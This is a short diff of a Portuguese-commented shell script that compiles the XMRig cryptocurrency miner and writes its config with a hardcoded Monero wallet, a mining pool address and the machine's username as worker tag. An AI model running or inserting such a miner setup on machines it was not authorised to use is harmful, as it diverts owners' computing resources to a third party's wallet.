@@ -22,9 +22,6 @@ cd build
 sudo cmake ..
 sudo make -j$(nproc)
 
-# Cria o diretório para o arquivo de configuração, se não existir
-sudo mkdir -p /root/.config
-
 # Cria um arquivo de configuração para o XMRig
 # Adiciona o nome de usuário da máquina à carteira
 USER_NAME=$(whoami)
@@ -32,8 +29,8 @@ WALLET="45mqjub6KDy14qcSZcjjDA1kXFGu5xiBVPJKoZrMgicH1skGVVzPzVYHJR27CbyiyKDzFf89
 POOL="xmrpool.eu:9999"
 USER_WALLET="${WALLET}+${USER_NAME}"
 
-# Cria o arquivo de configuração diretamente no diretório correto
-cat > /root/.config/xmrig.json <<EOF
+# Cria o arquivo de configuração
+cat > config.json <<EOF
 {
     "autosave": true,
     "cpu": {
